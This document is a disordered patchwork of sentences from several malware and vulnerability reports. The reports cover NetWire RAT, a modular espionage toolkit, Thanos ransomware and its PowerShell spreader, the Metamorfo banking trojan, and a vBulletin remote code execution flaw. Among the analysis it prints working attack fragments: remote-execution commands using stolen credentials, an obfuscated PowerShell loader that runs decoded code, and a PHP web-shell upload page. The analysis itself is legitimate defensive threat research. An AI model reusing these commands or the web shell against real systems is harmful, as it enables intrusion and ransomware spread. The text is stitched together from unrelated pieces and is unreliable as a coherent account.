0	For more information reach out at shai@reasonsecurity.comOffline version of the analysis can be found here
0	Once the installation is complete, click Finish.
0	NetWire is a Remote Access Trojan (RAT) malware that has been widely used for many years.
0	Recently, FortiGuard Labs noticed a type of malware spreading via phishing email, and during the analysis of it, we discovered that it was a new variant of NetWire RAT.
0	A New NetWire RAT Variant is Being Spread via Phishing Email
0	Figure 1, below, is a screenshot of the phishing email content.
0	It contains a PDF-like picture at the bottom with a hyperlink pointing to the download link of NetWire.
0	It uses many anti-analysis techniques to protect it from being analyzed.
0	It dynamically extracts malicious code onto its memory and executes it.
0	It does this by comparing the mouse cursor position twice.
0	A non-matching result means the mouse has been moved.
0	cmp dword ptr [eax+8], 0 ; Dr1
0	pop eax ; Key API address, like kernel32.CreateProcessInternalW
0	call eax ; call the API like kernel32.CreateProcessInternalW
0	cmp dword ptr [edx+4], 41414141
0	The true code of NetWire was extracted to overwrite the existing code in the child process and it is executed there.
0	Then Windows will pop up a crash message, like the one shown in Figure 4.
0	Figure 5 is the screenshot of the process tree.
0	Figure 6 shows the screenshot of the Registry Editor.
0	Encoded Keylogger log file and its decoded content
0	The left side of Figure 7 is the encoded keylogger record and the right side is the plaintext content that was decoded by my python script.
0	Since its C&C server was down at the time I started to analyze this new variant, I used a fake C&C server on one of my test systems to send the crafted response packet used in my analysis.
0	Figure 8 shows a packet that is about to be sent to the C&C server.
0	The first four bytes are 56 in hexadecimal, which is the size of the following data.
0	07 is a special separator to separate different data fields.
0	It is 2019-09-14 16:59:34 in this analysis.
0	As I mentioned above, the function Task_Fun() handles the commands, with one subprocedure called for one command.
0	Command numbers: 09Ch, 09Ch, 0A3h, 0AFh, 0B6h, 0C3h
0	Lets take a look at them and see what they can do to the victims system.
0	Other than the 9B command, it has more than 80 subprocedures.
0	That means it can handle more than 80 commands sent from the C&C server.
0	These are the entire feature set that this new NetWire variant supports.
0	Should be in 097h ~ 0E8h
0	Command numbers: 09Fh, 0A0h, 0A1h, 0A2h, 0AEh, 0AFh, 0B0h ~ 0B5h, 0B7h, 0DFh, 0E8h
0	Below is an example of collected endpoint data from my test system:
0	1E6D8050 73 76 63 68 6F 73 74 2E 65 78 65 07 37 30 38 07 svchost.exe708
0	1E6D8060 54 43 50 07 30 2E 30 2E 30 2E 30 3A 31 33 35 07 TCP0.0.0.0:135
0	1E6D8070 30 2E 30 2E 30 2E 30 3A 30 07 4C 69 73 74 65 6E 0.0.0.0:0Listen
0	1E6D80F0 77 6B 2E 65 78 65 07 32 37 32 30 07 54 43 50 07 wk.exe2720TCP
0	The original downloading URL in the phishing email and the domain of the C&C server are both rated as Malicious Websites by the FortiGuard Web Filtering service.
0	The 7z file and decompressed exe file are detected as W32/NetWire.A!tr by the FortiGuard Antivirus service.
0	Sample SHA256
0	[PROFORMA-INVOICE 0990.exe]
0	C9EC52AE2DDB993E2DA0EFD4FBAB0BFECDC7CC6DA16E446AC9C92E7981733E6E
0	[PROFORMA-INVOICE 0990.7z]
0	56BB4AAC4E52FD5D71824782D1DBE05D4209045C1E5DD80936690E81652183B8
0	Learn more aboutFortiGuard Labsand the FortiGuard Security Servicesportfolio.Sign upfor our weekly FortiGuard Threat Brief.
0	Read about the FortiGuardSecurity Rating Service, which provides security audits and best practices.
0	Fortinet Protections for NetWire RAT
0	Known locations: %APPDATA%MicrosoftRtkN32Gdi.exe
0	The file is a PE EXE file, compiled with Microsoft Visual Studio 2010.
0	The module traverses the directories from a hardcoded list, looking for files with names matching regular expressions .*..
0	%SystemDrive%Documents and SettingsLocalServiceLocal SettingsApplication DataMicrosoft
0	%ALLUSERSPROFILE%Application DataMicrosoftOfficeData
0	If the file was decompressed without errors, it is expected to start with a header that describes an internal task.
0	DocBackdoor (Acrobat Reader and Microsoft Office plugin) module
0	Known file locations: add-on directories of Acrobat Reader or Microsoft Office, depends on installation settings.
0	The malware contains a universal plugin for Acrobat Reader and Microsoft Office application.
0	The plugin does not depend on the application so it could have been used with other applications, too.
0	The module iterates through file handle values from 0 to 65534 with step 4, and tries to get file size for every handle.
0	The module retrieves the name of the file, reads the whole file into memory and checks its last DWORD.
0	If the DWORD matches the magic value, it reads more values from the end of file.
0	If the operation mode byte is equal to 3, the module loads the decrypted payload as a PE DLL library using own PE format loader, and executes its DllMain function.
0	OfficeBDInstaller module (Microsoft Office plugin installer)
0	SetOption(conn_a.D_CONN, [65] nt-windows-online.com;nt-windows-update.com;nt-windows-check.com)
0	%ALLUSERSPROFILE%Application DataMicrosoftOfficeData
0	%ProgramFiles%Microsoft OfficeOffice11Data
0	FriendlyName=%msplugin_desc1 option value%
0	HKCRCLSID%plugins CLSID%VersionIndependentProgID
0	LoadBehavior=DWORD:0x10
0	List of C&C domain names, separated by ;
0	SetOption(conn_a.J_USER, [21] %removed% )
0	Main function (task_arplugin)
0	ED5FF814B10ED25946623A7EC2C0A682
0	Known samples share one code section, but contain different payloads in the resource section.
0	All the functionality is implemented in the DllMain function.
0	SetOption(conn_a.D_CONN, [65] nt-windows-online.com;nt-windows-update.com;nt-windows-check.com)
0	Once it is loaded it was designed to start scanning other hosts in the network and record responses.
0	It would do several probes for remote vulnerabilities, such as MS08-067.
0	It is capable of dumping current configuration of Cisco routers if they are available via SNMP and the scanner successfully guessed the SNMP community name.
0	It seems that it was developed and tested as an EXE file, however in the release version it was compiled as a DLL.
0	This change was extremely significant for the whole functionality which creates a number of worker threads right in the main function, which is would be fine for EXE module WinMain function, but is restrcited for library DllMain function.
0	This broke down the module as it created threads which couldnt run when DLL is loaded via LoadLibrary API.
0	However, its important to note that the developers implemented own PE loader, which doesnt have such limitation as Window native PE loader, and which is why it can still be used as a component of malicious kit.
0	CISCO configuration dumper function call graph
0	Next it checks host for SIP service.
0	OPTIONS sip:smap@localhost SIP/2.0
0	Call-ID: 1638708638@%Local IP%
0	IP%:11122;branch=z9hG4bK.51125;rport;alias
0	From: ;tag=3a539be23b6269ec
0	However, availability of LLSRPC pipe is checked only to detect the remote OS Service Pack version.
0	There are few other methods in the code that provide reliable detection of Service Pack 1,2,3 of Windows 2000.
0	156 is some SQL Server port, however we dont know any software running on port 156
0	1043 can be used by BOINC software or Microsoft IIS
0	If ports 80 or 8080 are open, then the module sends simple HTTP request to test if the remote webserver is available and if it is running MS Excahnge server.
0	MS Exchange is probed with the following HTTP request:
0	GET /ews/exchange.asmx HTTP/1.0
0	Collected information and logs are never saved to a file on disk, instead it is compressed using Zlib compress2 method and uploaded to the server.
0	SetOption(conn_a.D_CONN, [60] microsoftosupdate.com;microsoft-msdn.com;microsoftcheck.com)
0	The config defines parameters for the method task_msexploit, which includes the following:
0	msexploit_loc  a payload to be pushed if exploit worked successfully;
0	msexploit_ip  an array of IPs to attack.
0	Then the module gets local proxy settings, starting from MS Internet Explorer settings, then parsing Opera profile files (if exist) and finally getting proxy settings from quite suspicious registry keys:
0	HKCUSoftwareMicrosoftWindowsCurrentVersionExplorerAdvancedMapMenuConfigGrps
0	HKLMSoftwareMicrosoftWindowsCurrentVersionExplorerAdvancedMapMenuConfigGrps
0	We suspect that this registry key is set by a malicious module during operation and is used to store proxy server parameters.
0	The adt.dat file is an encrypted INI-file of known credentials of users in current domain and attacked organization.
0	When decrypted this file looks like this:
0	This information is checked against local domain controller to find active users with Admin privileges.
0	However, the only setting that is changed is MapMenuConfigGrps value mentioned above.
0	It is set to local parameters of system proxy server which were acquired before.
0	This is done right after the main attack procedure which uses vulnerability from MS08-067 Security Bulletin.
0	The MS08-067 attack procedure uses code identical to the code of scanning for vulnerable hosts in Netscan module.
0	This module is used to infect other computers in local area network by another module known as Frog (full description of Frog is available in a separate chapter), which is embedded in current executable.
0	The later is a backdoor component which provides capability to run arbitrary executable on the remote target.
0	The credentials are used to access system administrative share and remotely install the backdoor as a service.
0	The adt.dat file is an encrypted INI-file of known credentials of users in current domain and attacked organization.
0	The logics of processing transmitted data for all threads are similar.
0	They can either send out data about current system or receive and run an executable module.
0	This function combines DllMain and ServiceMain functions excluding system service manager routines.
0	On July 6 and July 9, 2020, we observed files associated with an attack on two state-run organizations in the Middle East and North Africa that ultimately installed and ran a variant of the Thanos ransomware.
0	The Thanos variant created a text file that displayed a ransom message requesting the victim transfer 20,000$ into a specified Bitcoin wallet to restore the files on the system.
0	We do not have visibility into the overall impacts of these attacks or whether or not the threat actors were successful in receiving a payment from the victims.
0	Thanos ransom note displayed after encrypting files.
0	The ransomware was also configured to overwrite the master boot record (MBR), which is an important component loaded on a systems hard drive that is required for the computer to locate and load the operating system.
0	The ransomware overwrites the MBR to display the same ransom message as the previously mentioned text file, which is a technique we do not see often.
0	We believe the threat actors had prior access to these organizations networks, as the samples contained credentials that we believe the actors had stolen from systems on these organizations networks prior to the delivery of the ransomware.
0	This particular attack involved multiple layers of PowerShell scripts, inline C# code and shellcode in order to load Thanos into memory and to run it on the local system.
0	Palo Alto Networks customers are protected from the attacks discussed in this blog by WildFire, which correctly identifies all related samples as malicious, and Cortex XDR, which blocks the components involved in this ransomware infection.
0	Overview of Thanos Variant Activity
0	We do not know how the actors delivered the Thanos ransomware to the two state-run organizations in the Middle East and North Africa.
0	However, we know the threat group behind the use of these tools had previous access to these networks as they had already obtained valid credentials from the networks.
0	The C# code is the third layer, and it is based on UrbanBishop, which is publicly available as part of the Sharp-Suite framework on GitHub.
0	The PowerShell spreader, which we call LogicalDuckBill, has two primary purposes:
0	Loading and running the Thanos ransomware.
0	Add-Type -TypeDefinition $code -Language CSharp
0	LogicalDuckBill will then check to see if a file named logdb.txt 
0	The spreader functionality of LogicalDuckBill starts with the script using the Get-NetTCPConnection cmdlet to get the remote addresses of the current TCP connections on the system.
0	if((Test-NetConnection $tr -Port 445).TcpTestSucceeded){
0	net use x: \\[IP address]\c$ /user:[Victim Domain]\[Username] [Password]
0	copy c:\windows\update4.ps1 x:\windows\update4.ps1
0	wmic /node:[IP address] /user:[Victim Domain]\[Username]
0	The Thanos ransomware was first observed by Recorded Future in February 2020 when it was advertised for sale on underground forums.
0	The Thanos ransomware has code overlaps with other ransomware variants, such as Hakbit, and has a builder that allows the user to customize the sample with a variety of available settings.
0	Like other Thanos ransomware samples, the variant built to run on these two organizations networks uses a 2048-bit RSA public key to encrypt files whose file extensions match those listed in Table 1.
0	The ransom note, as seen in Figure 2, requests 20,000$ worth of Bitcoin be transferred to a wallet 1F6sq8YvftTfuE4QcYxfK8s5XFUUHC7sD9 and a contact email of josephnull@secmail.pro to recover the encrypted files.
0	Contact us at: get-my-data@protonmail.com...", but the code will replace this string with the following string before writing to disk:
0	The interesting part of the overwriting of the MBR in this specific sample is that it does not work correctly, which can be blamed on either a programming error or the custom message included by the actor.
0	As you can see above, the custom message has the bytes " " for the apostrophe character in unicode, but the code attempts to convert each character using the "Convert.ToByte" function to replace a single byte in the initial ransom string.
0	However, the unicode apostrophe character is three bytes long and causes an exception that breaks the MBR overwriting functionality.
0	The code uses a management event watcher that calls a function when a new storage volume is connected using the following WMI query:
0	SELECT * FROM Win32_VolumeChangeEvent WHERE EventType = 2
0	When the event watcher detects a new storage volume connected, it creates a thread that carries out the file encrypting functionality used by Thanos to encrypt files on the original storage volumes.
0	While we cannot confirm the connection, we believe the actors deploying the Thanos ransomware at the Middle Eastern state-run organization also used a downloader that we call PowGoop.
0	The only code overlap is a common variable name $a that both of the scripts use to store the base64 encoded data prior to decoding, which is not a strong enough connection to suggest a common author.
0	powershell -exec bypass function bdec($in){$out = [System.Convert]::FromBase64String($in);return [System.Text.Encoding]::UTF8.GetString($out);}function bDec2($szinput){$in = [System.Text.Encoding]::UTF8.GetBytes($szinput);for ($i=0; $i -le $in.count -1; $i++){$in[$i] = $in[$i] - 2;}return [System.Text.Encoding]::UTF8.GetString($in);}function bDd($in){$dec = bdec $in;$temp = bDec2 $dec;return $temp;}$a=get-content C:\\Users\\[username]\\Desktop
0	config.dat;$t =bDd $a;iex($t);
0	Actors used the Thanos ransomware to encrypt files and a PowerShell script to spread to additional systems, specifically on networks of two state-run organizations in the Middle East and North Africa.
0	The Thanos variant created a text file that displayed a ransom message requesting the victim transfer 20,000$ into a specified Bitcoin wallet to restore the files on the system.
0	Most importantly, this variant of Thanos also included the new ability to overwrite the MBR and display the same ransom message.
0	Overwriting the MBR is a much more destructive approach to ransomware than previously used by Thanos and would require more effort for victims to recover their files even if they paid the ransom.
0	AutoFocus customers can track this ransomware, PowerShell spreading script and the potentially related downloader with the tags Thanos, LogicalDuckBill and PowGoop.
0	Cortex XDR blocks Thanos ransomware, LogicalDuckBill and PowGoop.
0	40890a1ce7c5bf8fda7bd84b49c577e76e0431e4ce9104cc152694fc0029ccbf
0	b60e92004d394d0b14a8953a2ba29951c79f2f8a6c94f495e3153dfbbef115b6 (legitimate Google installer, GoogleUpdate.exe)
0	Sign up to receive the latest news, cyber threat intelligence and research from us
0	Popular ResourcesResource Center
0	FortiGuard LabsThreat Analysis Report: This blog originally appeared on the enSilo website and is republished here for threat research purposes.enSilo wasacquiredby Fortinet in October 2019.
0	This blog post describes in detail one of the variants used in this campaign, and highlights unique Tactics, Techniques and Procedures (TTPs) used in this campaign which were not previously disclosed.
0	The following are the static characteristics of theWindows Installer (MSI)downloader, which starts the infection.
0	Created using the "Advanced Installer" tool, which is imported in all of them, as shown in Figure 4.
0	Contain a vmdetect.exe [MD5: 55FFEE241709AE96CF64CB0B9A96F0D7] to avoid detection, as also shown in Figure 4:
0	FIGURE 4: EMBEDDED AICUSTACT.DLL AND VMDETECT.EXE
0	The source of the code that is executed can be a stream contained within the database, a recently installed file, or an existing executable file.
0	This MSI downloader is similar to the one used in the earlier part of the campaign:
0	Note that both URLs use the Brazilian two-letter abbreviation, suggesting the victims origin.
0	This is a legitimate file,AVDump32.exe,and it is digitally signed by"AVAST Software"as shown in Figure 6:
0	The process wmplayer.exe is a rather strange victim for injection, given that various Windows distributions dont come with Windows Media Player installed by default.
0	We can infer from this that this software is probably more commonly used in the victims origin, and that it probably targets home users.
0	Figure 10 shows theCreateProcesscall:
0	FIGURE 10: THE START OF THE DLL INJECTION
0	This makes the payload harder to detect by memory forensics toolkits and security products, which many times look specifically for executable memory.
0	The original function of the API is to be part of the process chain by creating a timer routine.
0	The use ofCreateTimerQueueTimermakes detection harder since the payload will not run in the remote thread context.
0	This kind of technique was previously used in malware variants such as Emotet and Hancitor.
0	These artifacts were not available to us and we couldnt verify their purpose.
0	FIGURE 16: DEBUG OUTPUT OF THE COLLECTED DATA
0	If the victim is from Brazil or Portugal, it will start monitoring running applications in the system using a message loop:
0	FIGURE 17: DEBUGGING RUNNING APPLICATION
0	Some of them are encrypted and will be used as payloads to steal victims data, while others are cursor related resources.
0	Like samples from previous campaigns, Metamorfo can display fake forms on targeted banking sites and steal credentials from its victims.
0	In previouscampaigns, Metamorfo used Windows Update to hide its malicious activity.
0	Metamorfo also makes efforts to evade banking protection and anti-fraud products by setting a hook onLoadLibraryWfunction and checking which DLL is loaded.
0	FIGURE 21: SOME OF THE BANKING PROTECTION AND ANTI-FRAUD SEARCHED STRINGS
0	C00BF102482C61E4CAB3C6B6666697779092FADC
0	https://s3-eu-west-1[.
0	]amazonaws.com/disenyrt3/image2.png
0	https://s3-eu-west-1[.
0	]amazonaws.com/sharknadorki/image2.png
0	https://s3-eu-west-1[.
0	The Metamorfo banking trojan has been around for a few years but it remains a successful payload due to the continuous updating of its features.In this case a fake Adobe installer was used to get the user to execute the malware.
0	To evade detection the threat leveraged a legitimate signed AV executable to side load a malicious DLL file.In the end malware is made to change resulting in a constant emergence of slightly modified variants to successfully execute on a victim machine.
0	TheFortiEDRplatform is capable of detecting the this threat on both pre-execution and post-execution.
0	The Webfiltering service identifies all the network IOCs as malicious.
0	Learn more aboutFortiGuard Labsthreat research and the FortiGuard Security Subscriptions and Servicesportfolio.Sign upfor the weekly Threat Brief from FortiGuard Labs.
0	Learn more about Fortinetsfree cybersecurity training initiativeor about the FortinetNetwork Security Expert program,Network Security Academy program, andFortiVet program.
0	[7F4HRE-375E-ef3-BE9A-OBJT389F53]
0	Compilation date (encrypted)
0	76e1d54a890befed31a369ce40b44ee6
0	__CFStringMakeConstantString
0	/private/var/mobile/Library/WebKit/Databases/https_m.mg.mail.yahoo.com_0/0000000000000004.db
0	The log starts with a MAGIC number 0x5C63F935, then 0x14 bytes of 0xFF, DWORD length of header, header data, then log data.
0	The data consists of tagged records.
0	The following tag values are known to us:
0	0x8002 Time/date
0	0x8004 SHA1 of MAC address, System Volume Serial Number, IE Product ID, the same is written in HKCU,HKLMSOFTWAREMicrosoftADOSoftware32, ProductID
0	Compressed directory log starts with magic 0x5C63F934.
0	Writes to log ===========PROGRAM_STARTED_V_0.1======= followed by time stamp.
0	CONAFreeFolderInfoStructure
0	CONAFreeFolderContentStructure
0	Extracts inbox, outbox, sent, archive messages, drafts, templates, SMS/MMS messages from users folders with statuses SENT, UNREAD, READ, DRAFT, PENDING, DELIVERED, SENDING, or with undefined status UNDEFINED MESSAGE_STATUS or UNDEFINED FOLDER ID.
0	Extracts meetings, birthdays, memos, reminders, notes, To Do lists with repetition attributes NONE, ILY (I suppose it means DAILY but authors must have mistyped), WEEKLY, MONTHLY, YEARLY or Unknown; with priority attributes HIGH, NORMAL, LOW or Unknown; with action attributes NEEDS_ACTION, COMPLETED or Unknown; with alarm attributes NOT_SET, SILENT, WITH_TONE or UNKNOWN; with starting/ending time, subject, location and status.
0	09b4f1e0c03d7dbdac402df4c0625167 15:52:36, October 19, 2010
0	70bee4d4141e6d963aa72a0da08b6683 (724992 bytes)
0	WCELOAD (CAB file installer): cab
0	WMPLAYER (Windows Media Player): mp4, 3gp, amr, avi, wav, wma, wmv, asf, midi, aac, mp3d, mp3
0	IEXPLORE1 (Internet Explorer): res, wsp, file, https, ftp, http, url, ico, html, xml, xhtml, xsl
0	4119  This setting grants the system administrative privileges held by SECROLE_MANAGER to other security roles.
0	Value 16 is User Authenticated role.
0	4101  This setting indicates whether unsigned .cab files can be installed on the device.
0	Value 222 indicates that only OEM, Operator, Manager, UserAuth, UserUnAuth, Operator-TPS can run unsigned .cab file.
0	4102  This setting indicates whether unsigned applications are allowed to run on Windows Mobile devices.
0	4097  This setting restricts the access of remote applications that are using Remote API (RAPI) to implement ActiveSync operations on Windows Mobile devices.
0	Value 1 indicates full access to ActiveSync is provided.
0	A device with one-tier access focuses only on how an application should run based on whether the application is signed with a certificate in the device certificate store.
0	There is no concern with permission restriction.
0	09b4f1e0c03d7dbdac402df4c0625167 (393216 bytes)
0	CeRegQueryValueEx
0	12:00:01, July 7, 2011
0	File names: pdf_viewer.exe, word.exe, excel.exe, iexplorer.exe, img.exe, powerpoint.exe, wceloader.exe, wmplauer.exe
0	All the values and fields in this XML (it is stored inside file) are the same as in Windows Mobile module for Windows.
0	This module is a simple non-interactive FTP client.
0	SetOption(conn_a.VER_SESSION_ID, %removed%)
0	SetOption(conn_a.SEND_DELAY_TIME, [5] 2000)
0	windowscheckupdate.com;windows-genuine.com;windowsonlineupdate.com)
0	SetOption(ftp_file_time, 2012-10-30 00:00:00 )
0	The config defines parameters for the method task_wnftpscan, which uses WinInet library functions to connect to remote FTP server using parameters set in the config and iterate trough directories.
0	Option ftp_crdir is set to 0, which prevents the code from checking if write-access is available.
0	There are max and min file size constraints, set to 1MB and 10 bytes respectively.
0	Additionally there is a date constraint which is set to 2012-10-30, indicating the earliest date of interest.
0	Seems that attackers have already fetched files before that date.
0	GetFileReg module
0	Known variants (all share the same code section, differ in resources):
0	469F4B81A01B1577531812385CAC827E
0	2011.07.18 07:03:52 (GMT)
0	The file is a PE DLL file, 0 exports, compiled with Microsoft Visual Studio 2008.
0	All functionality is implemented in the DllMain function.
0	@fileinforeg_logGETFILEREG_STARTED_V1_%s.txt
0	@fileinforeg_logGETFILEREG_V1_%s.txt
0	The resource is expected to be an INI file compressed using Zlib.
0	Option name Description
0	f_max_size Maximum file size to look for
0	f_min_size Minimum file size to look for
0	f_time_min Minimum file creation or modification time to look for
0	f_time_max Maximum file creation or modification time to look for
0	f_regexp_a Regular expression to match against the filename (must match)
0	f_regexp_d Regular expression to match against the filename (must not match, exclusion list)
0	f_search_path Directories to traverse
0	f_delete_file Delete the file after sending its contents to the C&C server
0	List of C&C server domain names, separated with ;
0	The file is a PE DLL file with 2 exported functions, compiled with Microsoft Visual Studio 2010.
0	All functionality is implemented in the START function.
0	The module is very similar to the GetFileReg module.
0	It is stored on disk as an encrypted file that is loaded by the Scheduler module.
0	Directory traversal and file matching rules
0	On/off switches for features, global settings
0	i_process_all_net_res (new in fileinfo)
0	When turned on, only host_d exclusion list is applied.
0	When turned off, only network paths matching host_a are processed.
0	i_getfile_all_dbx
0	Level of log verbosity: normal, quiet, extend
0	process_ldisks_sleep (new in fileinfo)
0	Delay between each traversal, PROC_LDISKS
0	process_ndisks_sleep (new in fileinfo)
0	Delay between each traversal, PROC_NDISKS
0	The following options apply only to the i_getfile section they are specified in
0	Minimum file creation or modification time to look for
0	Regular expression of network locations that should not be traversed (exclusion list)
0	Every thread has a distinct scope of subjects to process:
0	Directories shared over the network, called PROC_SHARES
0	Disks shared over the network, called PROC_NDISKS
0	Search paths specified in i_getfile sections, called PROC_SPATHS
0	Local disks, called PROC_LDISKS
0	The actual file matching and directory traversal code is almost identical to the one implemented in GetFileReg.
0	Four options control this behavior, each corresponding to one thread:
0	process_ldisks_sleep
0	process_ndisks_sleep
0	process_nshare_sleep
0	The directory traversal threads run their code in infinite loops, and sleep values specify the delay in milliseconds that should pass between iterations.
0	Although the module extracts the C&C server information from its configuration file, it does not interact with the C&C server in any way.
0	Since traversal routines are now executed in separate threads, the fileinfo module introduces continuous mode of operation.
0	Regular expression to match against the filename (must not match, exclusion list)
0	Remote disks are enumerated from C$ to Z$
0	Minimum file size to look for
0	spec_check_task_existance_a
0	Exploits in the Wild for vBulletin Pre-Auth RCE Vulnerability CVE-2020-17496
0	          By Haozhe Zhang, Qi Deng, Zhibin Zhang and Ruchna
0	Tags: CVE-2019-16759, CVE-2020-17496, exploits, threat prevention, vulnerabilities
0	This post is also available in: 
0	 (Japanese)Executive Summary
0	In September 2019, a remote code execution (RCE) vulnerability identified as CVE-2019-16759 was disclosed for vBulletin, a popular forum software.
0	At that time, Unit 42 researchers published a blog on this vBulletin vulnerability, analyzing its root cause and the exploit we found in the wild.
0	More than 100,000 sites are built on vBulletin, including the forums of major enterprises and organizations, so its imperative to patch immediately.
0	In this blog, we provide details on the bypass of the patch of the vulnerability, proof of concept code (PoC) to demonstrate the vulnerability and information on attacks we have observed in the wild.
0	Palo Alto Networks customers are protected by the following services and products via Threat Prevention signatures and URL Filtering blocks the related C2 traffic.
0	Root Cause Analysis of the Vulnerability (CVE-2020-17496)
0	As shown in Figure 1, the values of parameters for this function are from $_REQUESTS, $_GET and $_POST.
0	Since the generated code has a line of vB5_Template_Runtime::evalPhp('' .
0	$widgetConfig['code'], the malicious code in the request will be executed.
0	if (empty($widgetConfig) AND !empty($widgetinstanceid))
0	''; $widgetConfig = vB5_Template_Runtime::parseData('widget', 'fetchConfig', $widgetinstanceid);
0	$final_rendered .= '' . '
0	$widgetid = $widgetConfig['widgetid'];
0	$final_rendered .= '' . '
0	vB5_Template_Runtime::includeTemplate('module_title',array('widgetConfig' => $widgetConfig, 'show_title_divider' => '1', 'can_use_sitebuilder' => $user['can_use_sitebuilder'])) . '
0	if (!empty($widgetConfig['code']) AND !vB::getDatastore()->getOption('disable_php_rendering'))
0	$final_rendered .= ' ' . ''
0	12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879
0	''; $widgetConfig = vB5_Template_Runtime::parseData('widget', 'fetchConfig', $widgetinstanceid);$final_rendered .= '' . '
0	vB5_Template_Runtime::includeTemplate('module_title',array('widgetConfig' => $widgetConfig, 'show_title_divider' => '1', 'can_use_sitebuilder' => $user['can_use_sitebuilder'])) . '
0	Eval the PHP code rendered from the XML template
0	Beginning from version 5.5.5, a fix for CVE-2019-16759 was introduced into the function callRender() as shown in Figure 4.
0	It uses a disallow-list mechanism to check the template name.
0	If the name is widget_php, the engine wont render the requested template.
0	After the fix, widget_php is the only template that can be used to execute PHP code, as shown in Figure 5.
0	Figure 5. evalPhp() executes code only when the template is widget_php
0	The fix makes widget_php the only template that can be utilized for PHP code execution, and meanwhile, restricts the users access to this template.
0	However, in the latest bypass, we found that another template can be utilized to load this template.
0	That template is widget_tabbedcontainer_tab_panel.
0	This template widget_tabbedcontainer_tab_panel shown in Figure 6, above, is a template that can be used to render multiple child templates.
0	The code below is the PHP code that is rendered from the widget_tabbedcontainer_tab_panel template in XML.
0	vB5_Template_Runtime::includeTemplate($subWidget['template'],array('widgetConfig' => $subWidget['config'], 'widgetinstanceid' => $subWidget['widgetinstanceid'], 'widgettitle' => $subWidget['title'], 'tabbedContainerSubModules' => $subWidget['tabbedContainerSubModules'], 'product' => $subWidget['product'])) . '
0	Based on our analysis, we can construct the exploit code to prove the functionality.
0	The calling of the function callRender requires the POST HTTP method (according to Figure 7).
0	Figures 9 and 10 show some other manipulated requests that have the same effect.
0	In the URL, the child template name widget_php and the malicious code phpinfo();exit(); are in the array subWidget as the first element.
0	We caught the first incident of CVE-2020-17496 exploitation on Aug. 10, 2020, and later found that exploitation attempts from different IP addresses are ongoing.
0	Note that these are disparate attacks and not a coordinated effort by any particular attackers.
0	These scans are trying to find vulnerable sites and collect that information, which is an early step of cyber attacks.
0	The traffic is shown in Figures 11-15.
0	These payloads try to execute system commands echo and id, which can give attackers knowledge of whether or not the targets are vulnerable according to the responses.
0	The code provides an upload page for attackers to upload any files and conduct the follow-up steps of a cyber attack.
0	echo"<font color=#ff0000>".php_uname().
0	echo"<br><form method=post enctype=multipart/form-data>";
0	if(@copy($_FILES["f"]["tmp_name"],$_FILES["f"]["name"])){
0	echo"<b>".$_FILES["f"]["name"];
0	";$disable_functions = @ini_get("disable_functions"); echo "<br>DisablePHP=".$disable_functions; print "
0	"; echo"<br><form method=post enctype=multipart/form-data>"; echo"<input type=file name=f><input name=k type=submit id=k value=upload><br>"; if($_POST["k"]==upload){ if(@copy($_FILES["f"]["tmp_name"],$_FILES["f"]["name"])){ echo"<b>".$_FILES["f"]["name"]; }else{ echo"<b>Gagal upload cok"; } } ?>
0	echo"<br><form method=post enctype=multipart/form-data>";
0	There are multiple kinds of exploit attempts against vBulletin pre-auth RCE vulnerability CVE-2020-17496 being detected by our threat platform.
0	As a widely used forum software package that has been running for a long time in the market, it has been identified as a prized target by attackers.
0	vBulletin released the patch to fix this vulnerability on Aug. 10, 2020.
0	Applying the patch to the latest version will mitigate the risks, which is strongly advised.
0	Palo Alto Networks customers are protected by the following services and products:
0	Threat Prevention Signature 59133 and 80671.
0	Exploits in the Wild for vBulletin Pre-Auth RCE Vulnerability 
0	88DDD8A1B77477AAFFD1BB163B9770D72A77BF29BFCA226E79C28D15BEF983ED
0	Mirai Variant (Sora) Hashes
0	3bfec4e039805091fe30fa978d5ec7f28431bb0fca4b137e075257b3e1c0dd4
0	By submitting this form, you agree to our Terms of Use and acknowledge our Privacy Statement.
0	Sign up to receive the latest news, cyber threat intelligence and research from us
0	Please enter your email address!
0	2022 Palo Alto Networks, Inc. All rights reserved.
0	In 2019, FortiGuard Labs was investigating the Sodinokibi ransomware family, when we came across the newly discovered Nemty Ransomware.
0	Interestingly, as we analyzed this new malware, we also encountered an artifact embedded in its binary that we were very much familiar with since it was also used by the GandCrab ransomware before the threat actors announcedretirement.
0	It is also interesting to see that the Nemty ransomware is being distributed using the same method as Sodinokibi, a malware that has strong similarities to GandCrab.
0	This report discusses the technical aspects of the new ransomware, including some irregularities that make us think that it is still in its early stage of development.
